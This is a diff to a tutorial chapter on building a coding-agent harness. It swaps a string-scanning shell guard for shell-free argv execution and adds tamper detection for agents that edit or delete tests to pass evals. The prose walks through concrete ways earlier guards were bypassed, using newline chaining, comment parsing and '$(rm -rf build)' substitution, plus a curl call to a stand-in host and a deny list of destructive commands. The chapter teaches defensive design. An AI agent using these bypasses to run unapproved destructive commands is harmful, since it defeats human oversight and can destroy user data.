@@ -158,13 +158,64 @@ class Session:
     headless: bool = False                              # no human to prompt
 
 
+# Commands that may run with no shell and no human. Each entry is matched as a
+# whole token sequence against the parsed argument vector, never as a string
+# prefix, so "ls" admits `ls -la` and not `lsof`.
+READ_ONLY_COMMANDS = (
+    "ls", "cat", "head", "tail", "grep", "rg", "find", "wc", "git status",
+    "git diff", "git log", "pwd", "which", "python --version", "pytest --collect-only",
+)
+
+# Extra commands the automation mode may run without a human: enough to build
+# and test, nothing that reaches the network, rewrites history, or hands the
+# model a bare interpreter it can type arbitrary code into.
+AUTOMATION_COMMANDS = READ_ONLY_COMMANDS + (
+    "pytest", "python -m pytest", "python3 -m pytest", "python -m unittest",
+    "npm test", "npm run test", "make test", "make lint",
+    "git add", "git commit",
+)
+
+
+def allowed_argv(cmd: str, allowlist: tuple[str, ...]) -> list[str] | None:
+    """Parse cmd into an argv that needs no shell, or None if it is not allowed."""
+    try:
+        argv = shlex.split(cmd)
+    except ValueError:
+        return None                     # unbalanced quotes: fail closed
+    if not argv:
+        return None
+    for entry in allowlist:
+        head = entry.split()
+        if argv[:len(head)] == head:
+            return argv
+    return None
+
+
+def shell_free_allowlist(s: Session) -> tuple[str, ...]:
+    return AUTOMATION_COMMANDS if s.headless else READ_ONLY_COMMANDS
+
+
 def tool_bash(args: dict, s: Session) -> str:
-    command = args["command"]
+    command = args["command"].strip()
     timeout = int(args.get("timeout", 120))
-    proc = subprocess.run(
-        command, shell=True, cwd=ROOT, capture_output=True, text=True,
-        timeout=timeout, errors="replace",
-    )
+    argv = allowed_argv(command, shell_free_allowlist(s))
+    if argv is not None:
+        # No shell exists, so operators arrive as literal arguments.
+        proc = subprocess.run(
+            argv, cwd=ROOT, capture_output=True, text=True,
+            timeout=timeout, errors="replace",
+        )
+    elif s.headless:
+        raise ToolError(
+            "headless mode runs allowlisted commands without a shell; "
+            "this command needs one."
+        )
+    else:
+        # Reached only after a human read this exact string and approved it.
+        proc = subprocess.run(
+            command, shell=True, cwd=ROOT, capture_output=True, text=True,
+            timeout=timeout, errors="replace",
+        )
     out = (proc.stdout or "") + (proc.stderr or "")
     return clip(f"exit code: {proc.returncode}\n{out or '(no output)'}")
 
@@ -226,10 +277,12 @@ HANDLERS = {
 }
 ```
 
-Four safety properties are already present and each is a capability scaffold that will not decay:
+Five safety properties are already present and each is a capability scaffold that will not decay:
 
 - **Path confinement.** `resolve` canonicalizes before comparing, so `../../etc/passwd`, symlinks, and absolute paths are all caught by the same check.
 Doing the check on the raw string instead is the classic vulnerable version.
+- **No shell on the unattended path.** `allowed_argv` parses the command into an argument vector once, and `tool_bash` runs that vector with `shell=False`, so nothing ever re-interprets the string.
+Section 4 explains why this replaced a guard that scanned for shell operators, and why the scanning approach could not be made correct.
 - **Staleness invariant.** `edit_file` and overwrite refuse to act on a file the model has not read, which eliminates blind clobbering.
 - **Output clipping.** A single `find /` must not consume the context window.
 Clipping head and tail preserves the informative ends.
@@ -240,45 +293,10 @@ Clipping head and tail preserves the informative ends.
 ```python
 # agent.py  (part 3 of 6)
 
-READ_ONLY_PREFIXES = (
-    "ls", "cat", "head", "tail", "grep", "rg", "find", "wc", "git status",
-    "git diff", "git log", "pwd", "which", "python --version", "pytest --collect-only",
-)
-
 DENY_SUBSTRINGS = (
     "rm -rf /", "mkfs", ":(){", "dd if=", "shutdown", "reboot",
     "git push", "curl", "wget", "nc ", "chmod 777",
 )
-
-# Extra commands the automation mode may run without a human: enough to build
-# and test, nothing that reaches the network, rewrites history, or hands the
-# model a bare interpreter it can type arbitrary code into.
-AUTOMATION_PREFIXES = READ_ONLY_PREFIXES + (
-    "pytest", "python -m pytest", "python3 -m pytest", "python -m unittest",
-    "npm test", "npm run test", "make test", "make lint",
-    "git add", "git commit",
-)
-
-OPERATOR_CHARS = set(";|&<>()")
-
-
-def shell_operators(cmd: str) -> list[str]:
-    """Operators the shell would act on, ignoring characters inside quotes."""
-    if "\n" in cmd or "\r" in cmd:
-        return ["newline"]      # shlex calls it whitespace; the shell does not
-    lexer = shlex.shlex(cmd, punctuation_chars=True)
-    lexer.commenters = ""   # the shell starts a comment only at a word boundary
-    lexer.whitespace_split = True
-    try:
-        tokens = list(lexer)
-    except ValueError as exc:
-        return [f"unparsable ({exc})"]      # fail closed on unbalanced quotes
-    return [t for t in tokens if t and (set(t) <= OPERATOR_CHARS or "`" in t)]
-
-
-def matches_prefix(cmd: str, prefixes: tuple[str, ...]) -> bool:
-    """Prefix match on a token boundary, so `ls` does not admit `lsof`."""
-    return any(cmd == p or cmd.startswith(p + " ") for p in prefixes)
 
 
 def needs_approval(name: str, args: dict, s: Session) -> bool:
@@ -290,10 +308,8 @@ def needs_approval(name: str, args: dict, s: Session) -> bool:
             raise ToolError(f"command blocked by policy: {cmd!r}")
         if cmd in s.approved:
             return False
-        # Auto-allow single read-only commands with no shell chaining.
-        if not shell_operators(cmd) and matches_prefix(cmd, READ_ONLY_PREFIXES):
-            return False
-        return True
+        # Auto-allow only what can run as an argv, with no shell at all.
+        return allowed_argv(cmd, READ_ONLY_COMMANDS) is None
     return f"{name}:{args.get('path', '')}" not in s.approved
 
 
@@ -302,14 +318,10 @@ def automation_decision(name: str, args: dict) -> tuple[bool, str]:
     if name != "bash":
         return True, ""     # confined to ROOT, and read-before-write still applies
     cmd = args["command"].strip()
-    found = shell_operators(cmd)
-    if found:
-        return False, (f"shell operators ({', '.join(found)}) are not allowed in "
-                       "headless mode; issue one command per bash call.")
-    if not matches_prefix(cmd, AUTOMATION_PREFIXES):
-        return False, (f"{cmd.split(' ')[0]!r} is not on the headless allowlist; "
-                       "use the project's test or build commands, or re-run "
-                       "the agent interactively.")
+    if allowed_argv(cmd, AUTOMATION_COMMANDS) is None:
+        return False, (f"{cmd!r} is not on the headless allowlist, or needs a "
+                       "shell to run. Issue one allowlisted command with plain "
+                       "arguments, or re-run the agent interactively.")
     return True, ""
 
 
@@ -343,33 +355,48 @@ This is Chapter 2's trust gradient in miniature: a deny list that cannot be over
 
 The chaining check matters more than it looks.
 `ls` is safe; `ls && rm -rf build` starts with `ls` and is not.
-Prefix matching on a string that may contain shell operators is exactly how permission systems get bypassed, so the auto-allow tier refuses anything the shell would read as an operator.
-The tempting way to write that check is a substring scan over a list of operator strings, and it is wrong in both directions.
-It misses operators, because the obvious list is incomplete: a bare newline chains commands just as well as `;`, so `ls -la\nrm -rf build` sails through a guard that checks only for `&&`, `||`, `;`, `|`, and `>`.
-It also invents operators that are not there, because `rg 'foo|bar'` and `git commit -m "handle a || b"` carry those characters inside quotes, where the shell treats them as ordinary text.
-Inventing them is not a harmless excess of caution: the system prompt tells the model to search with `rg`, and section 8 runs the agent with no human to overrule the guard, so a false denial lands on the scoreboard as a failed task.
-So `shell_operators` tokenizes with `shlex` in punctuation mode, which understands quoting, and reports only the tokens that are made entirely of operator characters.
-Borrowing a tokenizer written for a different grammar is not free, though, and the two places `shlex` disagrees with the shell both have to be repaired by hand or the guard reopens the hole it was written to close.
-The newline case is settled before tokenizing, because `shlex` classifies a line break as whitespace while the shell classifies it as a command separator, and `.strip()` removes only the leading and trailing whitespace, not an embedded one.
-The comment character is the second disagreement and the more dangerous one, because `shlex` strips everything after a `#` anywhere in the string while the shell begins a comment only at a word boundary.
-Left at its default, the tokenizer reads `ls foo#bar; rm -rf build` as the single word `ls foo`, reports no operators at all, and hands a command the shell will happily split in two to the auto-allow tier; clearing `commenters` restores the `;` and costs nothing, since `ls # comment` still tokenizes without operators either way.
-Unbalanced quotes are reported as an operator as well, so a command the tokenizer cannot parse fails closed rather than open.
-Backticks are checked directly because `shlex` has no notion of command substitution, while `$(...)` needs no special case: the parentheses tokenize on their own.
-Both the auto-allow tier and the headless tier call that one function, so the two policies cannot drift apart.
+The tempting way to close that gap is to keep the command as a string, scan the string for the characters a shell treats as operators, and pass it to `subprocess.run(..., shell=True)` once the scan comes back clean.
+It is worth being blunt about how that went, because earlier drafts of this chapter did exactly that and the scan was bypassed four separate times.
+The first version listed the operator strings and checked for each as a substring, and it missed a bare newline, which chains commands just as well as `;`, so `ls -la\nrm -rf build` sailed straight through.
+It also invented operators that were not there, rejecting `rg 'foo|bar'` and `git commit -m "handle a || b"` whose characters sit inside quotes where the shell reads them as ordinary text.
+Rewriting the scan on top of `shlex` in punctuation mode fixed the quoting half and opened two new holes.
+`shlex` strips everything after a `#` anywhere in the string while the shell begins a comment only at a word boundary, so `ls foo#bar; rm -rf build` tokenized to the single word `ls foo` and reported no operators at all.
+Clearing `commenters` closed that one and left the last: `shlex` returns `"$(rm -rf build)"` as a single ordinary-looking token, so `ls "$(rm -rf build)"` reported no operators either, while the shell ran the substitution.
 
-The second half of the guard is the prefix test itself.
-`cmd.startswith("ls")` is true of `lsof`, `lsblk`, and any binary whose name happens to begin with those two letters, so the match has to land on a token boundary: either the whole command or the prefix followed by a space.
-Two lines of code, and without them the allowlist admits programs nobody put on it.
+The pattern in those four bugs is not carelessness, it is the shape of the problem.
+The guard reads a string and forms a belief about how the shell will split it, and then the same string is handed to a shell that splits it again under a grammar containing quoting, comments, command substitution, parameter expansion, process substitution, and aliases.
+Any such guard is a partial reimplementation of `bash`, so it should be assumed wrong until proven otherwise rather than correct until someone bypasses it.
+The fix is therefore not a better scanner.
+The fix is to stop creating a shell on the path where no human is reading the command.
+`allowed_argv` parses the command once with `shlex.split`, matches the leading tokens against one allowlist entry, and returns the argument vector; `tool_bash` runs that vector with `shell=False`.
+There is then no shell to interpret `;`, `&&`, a newline, `#`, `` ` ``, or `$(...)`, and each of those characters reaches the program as a literal argument instead.
+`ls "$(rm -rf build)"` becomes `ls` with one filename that does not exist, which is the correct outcome for a command nobody approved.
+A command with unbalanced quotes fails closed, because `shlex.split` raises and `allowed_argv` returns `None`.
 
-Note honestly what this still does not cover: `ls $(curl evil.sh)` is caught by the operator check, but a determined attacker with control of the model's input has a large search space, which is why the deny list, the path confinement, and - in real deployments - a container, all exist as layers rather than alternatives.
+Commands that genuinely need shell features are not blocked, they are moved.
+`allowed_argv` returns `None`, the auto-allow tier declines, and a human sees the exact string and decides.
+That is the only path in the agent that constructs a shell, and it does so with a person who read the command standing behind it.
+Headless mode has no such person, so it gets no shell at all: `automation_decision` allows only what parses into an argument vector, and `tool_bash` raises rather than falling back.
+
+Matching whole tokens rather than string prefixes is the second half of the guard.
+`cmd.startswith("ls")` is true of `lsof`, `lsblk`, and any binary whose name begins with those two letters, whereas `argv[:1] == ["ls"]` is true of `ls` alone.
+Comparing token lists also makes the multi-word entries exact for free: `git status` matches `git status --short` and not `git status-hack`.
+Both the auto-allow tier and the headless tier call the one function, so the two policies cannot drift apart, and they differ only in which allowlist they pass it.
+
+Note honestly what removing the shell does not cover.
+The allowlist authorizes programs, not arguments, so `pytest --rootdir=/` is on it, and `make test` runs whatever the repository's `Makefile` says.
+Section 7 takes that up.
+Removing the shell eliminates one class of bypass completely; it does not make the remaining surface small, which is why the deny list, the path confinement, and - in real deployments - a container all exist as layers rather than alternatives.
+`DENY_SUBSTRINGS` is still a substring scan, and it is still the weakest thing here, but it now guards only the path a human is already reading.
 
 The headless branch exists because an interactive prompt is not a policy when nobody is at the terminal.
 Calling `input()` from a process whose stdin is a closed pipe either blocks until the caller's timeout kills it or raises `EOFError` from inside the tool loop, and both outcomes look like an agent that mysteriously cannot finish.
-So `ask_permission` consults `automation_decision` first: file writes are allowed because `resolve` confines them to `ROOT` and the read-before-edit invariant still holds, while bash is held to the same operator check plus an explicit allowlist wide enough to run the project's tests.
+So `ask_permission` consults `automation_decision` first: file writes are allowed because `resolve` confines them to `ROOT` and the read-before-edit invariant still holds, while bash is held to the argv rule plus an explicit allowlist wide enough to run the project's tests.
 That allowlist stops deliberately short of a bare interpreter.
-`python -m pytest` is on it and `python` is not, because `python -c "__import__('shutil').rmtree('/')"` is a shell wearing a costume, and a prefix that admits it makes the entire tier decorative.
-The same reasoning keeps `make` off the list in favor of the specific targets a build is expected to use.
-Anything outside it comes back as a readable denial the model can act on, which means the run always terminates with a result rather than hanging.
+`python -m pytest` is on it and `python` is not, because `python -c "__import__('shutil').rmtree('/')"` needs no shell to do damage and an entry that admits it makes the entire tier decorative.
+Dropping the shell does not help here, which is the point: it closes the parsing class of bug and leaves the question of which programs you trust exactly where it was.
+The same reasoning keeps a bare `make` off the list in favor of the specific targets a build is expected to use.
+Anything outside the allowlist comes back as a readable denial the model can act on, which means the run always terminates with a result rather than hanging.
 The `EOFError` guard on the interactive path is the same lesson applied to the case where a terminal disappears mid-session.
 
 ## 5. The agent loop, transcripts, and compaction
@@ -598,7 +625,7 @@ Every guard in section 3 is defense in depth *behind* this, not a substitute for
 
 **Finish the allowlist.**
 Deny lists lose to creativity.
-The headless path inverts it already, rejecting shell operators outright and requiring a token-boundary match against `AUTOMATION_PREFIXES`, which is why the same harness can offer a permissive interactive mode and a strict automation mode.
+The headless path inverts it already, running only what parses into an argument vector whose leading tokens match `AUTOMATION_COMMANDS`, which is why the same harness can offer a permissive interactive mode and a strict automation mode.
 Two gaps remain, and both are about arguments rather than programs.
 The first is flag and path validation: `pytest` is on the list, and `pytest --rootdir=/` is on the list too.
 The second is indirection: `make test` and `npm run test` run whatever the repository's `Makefile` and `package.json` define, and the agent can edit both, so a program on the allowlist can still execute code the allowlist never inspected.
@@ -627,9 +654,20 @@ eval/
     off_by_one/
       repo/calc.py          # contains the bug
       repo/test_calc.py     # fails now, passes after the fix
-      task.json             # {"prompt": "...", "test_cmd": "pytest -q"}
+      task.json             # the spec below
     missing_validation/
     wrong_sort_key/
+```
+
+`protected_files` is the part readers most often leave out, and leaving it out disables tamper detection silently, so the sample carries it.
+Paths in it are relative to the fixture's `repo/` directory, the same root the runner copies.
+
+```json
+{
+  "prompt": "calc.total() returns one item too few. Fix it.",
+  "test_cmd": "pytest -q",
+  "protected_files": ["test_calc.py"]
+}
 ```
 
 ```python
@@ -643,6 +681,12 @@ AGENT = Path(__file__).resolve().parents[1] / "agent.py"
 
 def run_task(task_dir: Path) -> dict:
     spec = json.loads((task_dir / "task.json").read_text())
+    protected = spec.get("protected_files", [])
+    missing = [f for f in protected if not (task_dir / "repo" / f).is_file()]
+    if missing:
+        return {"task": task_dir.name, "status": "INVALID",
+                "note": f"protected files not in fixture: {', '.join(missing)}"}
+
     with tempfile.TemporaryDirectory() as tmp:
         work = Path(tmp) / "repo"
         shutil.copytree(task_dir / "repo", work)
@@ -668,10 +712,12 @@ def run_task(task_dir: Path) -> dict:
         after = subprocess.run(spec["test_cmd"], shell=True, cwd=work,
                                capture_output=True, text=True)
 
-        # 4. Reward-hacking check: the agent must not have modified the test file.
+        # 4. Reward-hacking check: the agent must not have modified or deleted
+        #    the test file. A missing protected file counts as tampering.
         tampered = any(
-            (work / f).read_bytes() != (task_dir / "repo" / f).read_bytes()
-            for f in spec.get("protected_files", [])
+            not (work / f).is_file()
+            or (work / f).read_bytes() != (task_dir / "repo" / f).read_bytes()
+            for f in protected
         )
         status = ("TAMPERED" if tampered
                   else "RESOLVED" if after.returncode == 0
@@ -681,7 +727,15 @@ def run_task(task_dir: Path) -> dict:
 
 
 def main() -> None:
-    results = [run_task(d) for d in sorted(TASKS.iterdir()) if d.is_dir()]
+    results = []
+    for d in sorted(TASKS.iterdir()):
+        if not d.is_dir():
+            continue
+        try:
+            results.append(run_task(d))
+        except Exception as exc:    # one bad fixture must not end the run
+            results.append({"task": d.name, "status": "ERROR",
+                            "note": f"{type(exc).__name__}: {exc}"})
     resolved = sum(r["status"] == "RESOLVED" for r in results)
     for r in results:
         print(f"{r['status']:<9} {r['task']:<24} {r.get('seconds', '-')}s")
@@ -698,11 +752,13 @@ Four properties make this a real eval rather than a vibe check, and all four com
 - **Fail-to-pass precondition.** Verifying the test fails first catches broken fixtures, which are the most common reason a homemade eval reports inflated scores.
 - **Hidden test.** The prompt describes the symptom; the test defines success and is never shown to the agent.
 - **Fresh copy per run.** Copying to a temp directory means runs cannot contaminate each other and a destructive agent cannot damage the fixture.
-- **Tamper detection.** `protected_files` catches the agent that "fixes" the bug by editing the test - Chapter 1's reward hacking, made concrete.
+- **Tamper detection.** `protected_files` catches the agent that "fixes" the bug by editing the test, or by deleting it outright, which is the same hack with less subtlety - Chapter 1's reward hacking, made concrete.
+The check treats a missing file as tampering rather than reading it and crashing, and the fixture is validated up front so a typo in `protected_files` reports INVALID instead of quietly scoring every run clean.
 
-One coupling to keep in mind: the harness runs the agent with `-p`, so every command the agent needs in order to verify its own work has to be on `AUTOMATION_PREFIXES`.
-If a fixture's `test_cmd` is `npm run test:unit`, the token-boundary match against `npm run test` does not cover it, so the agent is denied its verification step and the task scores FAILED for a policy reason rather than a capability one.
-Widen `AUTOMATION_PREFIXES` to cover every fixture's test command, and copy `.agent_transcript.json` out of the temp directory before the run tears it down, because the denial text lands in a tool result and a scoreboard that cannot distinguish a policy denial from a real failure is measuring your allowlist rather than your agent.
+One coupling to keep in mind: the harness runs the agent with `-p`, so every command the agent needs in order to verify its own work has to be on `AUTOMATION_COMMANDS`.
+If a fixture's `test_cmd` is `npm run test:unit`, the whole-token match against `npm run test` does not cover it, so the agent is denied its verification step and the task scores FAILED for a policy reason rather than a capability one.
+Widen `AUTOMATION_COMMANDS` to cover every fixture's test command, and copy `.agent_transcript.json` out of the temp directory before the run tears it down, because the denial text lands in a tool result and a scoreboard that cannot distinguish a policy denial from a real failure is measuring your allowlist rather than your agent.
+Note that the runner invokes `test_cmd` itself with `shell=True`, which is fine because you wrote it, and is exactly the distinction the agent's own bash tool draws between a string a human authored and a string a model produced.
 
 What to do with the numbers.
 Run each task at least three times, because agent runs are stochastic and a single pass tells you almost nothing; report resolved-fraction with the variance, plus median wall-clock and cost.
@@ -720,6 +776,7 @@ Knowing which half of your own code you expect to throw away is the mark of some
 2. Break the loop deliberately in four ways - drop `tool_use` blocks from the appended assistant message, return only one result for two tool calls, raise instead of returning an error result, and loop on tool-block count instead of `stop_reason` - and record the exact failure each produces so you recognize them in the wild.
 3. Add a `grep` tool that wraps ripgrep with a result cap and a clear too-many-results message; measure task completion on your eval before and after, and state whether it was capability or compensation.
 4. Add an argument validator on top of the headless allowlist and hold the interactive mode to the same policy, then write ten adversarial commands attempting to escape it; report how many succeeded and fix the ones that did.
+Run the same ten against a deliberately reintroduced string-scanning guard with `shell=True` behind it, and compare the two counts.
 5. Build five eval tasks from real bugs in your own git history: use the pre-fix commit as the fixture and the test added in the fixing commit as the hidden test; run the agent three times per task and report resolved-fraction with variance.
 6. Implement compaction two ways - the summary above, and simple truncation that keeps the first and last N messages - and measure resolved-fraction and token cost on a long task; state which lost more.
 7. Add adaptive thinking with `effort` set to `low`, `high`, and `xhigh`, and produce a table of resolved-fraction, cost, and wall-clock per level; pick the setting you would ship and defend it.
@@ -730,9 +787,10 @@ Knowing which half of your own code you expect to throw away is the mark of some
 You have mastered this chapter when you can:
 
 - Write the agent loop from memory, including appending full assistant content, pairing every tool result, batching results in one user message, and looping on `stop_reason`.
-- Explain each safety property in the tool layer - path confinement after canonicalization, the read-before-edit staleness invariant, output clipping, recoverable tool errors - and the specific bug each prevents.
+- Explain each safety property in the tool layer - path confinement after canonicalization, argv execution with no shell on the unattended path, the read-before-edit staleness invariant, output clipping, recoverable tool errors - and the specific bug each prevents.
 - Justify the exactly-once edit semantics and the line-numbered read format on ACI grounds without appealing to convention.
-- Describe the permission gradient you implemented, explain why prefix matching on chained commands is unsafe, name the operators an incomplete guard misses, and state why the container is the real control.
+- Describe the permission gradient you implemented, explain why scanning a command string for shell operators cannot be made correct while the same string is later handed to a shell, and state why the container is the real control.
+- Say what changes when the allowlisted path runs an argument vector with `shell=False`, which class of bypass that closes outright, and which one it leaves entirely untouched.
 - Explain why an interactive prompt is not a policy for an unattended run, and what your harness does instead when no terminal is attached.
 - Write a compaction prompt that preserves task intent and say what breaks when it does not.
 - Build a fail-to-pass eval harness from scratch, name its four integrity properties, and explain why tamper detection is not optional.
